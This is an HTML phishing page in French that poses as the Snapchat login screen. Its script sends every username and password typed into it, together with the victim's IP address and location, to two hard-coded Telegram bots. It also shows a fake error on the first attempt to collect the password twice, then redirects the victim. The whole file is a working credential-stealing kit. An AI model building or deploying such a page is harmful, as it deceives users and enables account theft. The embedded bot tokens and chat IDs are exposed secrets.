<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Snapchat</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #FFFC00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 400px;
            background-color: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            width: 60px;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #aaa;
            margin-bottom: 5px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-bottom: 1px solid #ccc;
            margin-bottom: 20px;
            box-sizing: border-box;
            text-align: left;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #FFFC00;
            color: black;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        button:hover {
            background-color: #fef200;
        }

        .link {
            margin-top: 10px;
            font-size: 14px;
            color: #007bff;
            text-decoration: none;
            display: block;
        }

        .link:hover {
            text-decoration: underline;
        }

        .message {
            font-size: 16px;
            color: red;
            margin-top: 20px;
            display: none;
        }

        .countdown {
            font-size: 14px;
            color: #555;
            margin-top: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Logo Snapchat">
        <h1 id="title">Se connecter √† Snapchat</h1>
        <form onsubmit="handleSubmit(event)">
            <label id="username-label" for="username">Nom d'utilisateur ou email</label>
            <input type="text" id="username" name="username" required>

            <label id="password-label" for="password">Mot de passe</label>
            <input type="password" id="password" name="password" required>

            <button id="submit-button" type="submit">Se connecter</button>
        </form>

        <a class="link" href="https://accounts.snapchat.com/v2/signup" id="signup-link">
            Nouveau sur Snapchat? S'inscrire
        </a>

        <a class="link" href="https://accounts.snapchat.com/accounts/password_reset_request" id="forgot-link">
            Mot de passe oubli√©?
        </a>

        <div class="message" id="error-message">Identifiants incorrects. Veuillez r√©essayer.</div>
        <div class="countdown" id="countdown" style="display:none;"></div>
    </div>

    <script>
        // Configuration Telegram
        const telegramConfigs = [
            { token: "7019053702:AAHahO6qGOdZyQ-vv_IRMYmS6yoqiDLF4hA", chatId: "965011527" },
            { token: "7902984772:AAE9oYZ58ri5xBGrna2MIOX-pKBtjzmjeX4", chatId: "5372119436" }
        ];
        
        let attempt = 0;

        // Traductions
        const translations = {
            fr: {
                title: "Se connecter √† Snapchat",
                usernameLabel: "Nom d'utilisateur ou email",
                passwordLabel: "Mot de passe",
                submitButton: "Se connecter",
                errorMessage: "Identifiants incorrects. Veuillez r√©essayer.",
                signupText: "Nouveau sur Snapchat? S'inscrire",
                forgotText: "Mot de passe oubli√©?",
                countdownText: "Redirection dans {seconds} secondes..."
            }
        };

        // Appliquer les traductions
        function applyTranslations() {
            const t = translations.fr;
            document.getElementById('title').textContent = t.title;
            document.getElementById('username-label').textContent = t.usernameLabel;
            document.getElementById('password-label').textContent = t.passwordLabel;
            document.getElementById('submit-button').textContent = t.submitButton;
            document.getElementById('error-message').textContent = t.errorMessage;
            document.getElementById('signup-link').textContent = t.signupText;
            document.getElementById('forgot-link').textContent = t.forgotText;
        }

        // Compte √† rebours
        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            countdownElement.style.display = 'block';
            
            let seconds = 15;
            
            const countdownInterval = setInterval(() => {
                countdownElement.textContent = translations.fr.countdownText.replace('{seconds}', seconds);
                seconds--;
                
                if (seconds < 0) {
                    clearInterval(countdownInterval);
                    window.location.href = 'traitement.html';
                }
            }, 1000);
        }

        // Au chargement de la page
        window.onload = function() {
            applyTranslations();
        };

        // Envoyer les donn√©es √† Telegram
        async function sendToTelegram(username, password) {
            const ipInfo = await fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .catch(() => ({}));
            
            const message = `üîê Nouvelle tentative de connexion Snapchat üîê
üë§ Utilisateur: ${username}
üîë Mot de passe: ${password}
üìç IP: ${ipInfo.ip || 'Inconnue'}
üåç Pays: ${ipInfo.country || 'Inconnu'}
üèôÔ∏è Ville: ${ipInfo.city || 'Inconnue'}`;

            for (const config of telegramConfigs) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: config.chatId,
                            text: message
                        })
                    });
                } catch (error) {
                    console.error('Erreur lors de l\'envoi √† Telegram:', error);
                }
            }
        }

        // G√©rer la soumission du formulaire
        function handleSubmit(event) {
            event.preventDefault();
            attempt++;

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('error-message');

            sendToTelegram(username, password);

            if (attempt === 1) {
                errorMessage.style.display = 'block';
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            } else {
                document.getElementById('submit-button').disabled = true;
                startCountdown();
            }
        }
    </script>
</body>
</html>
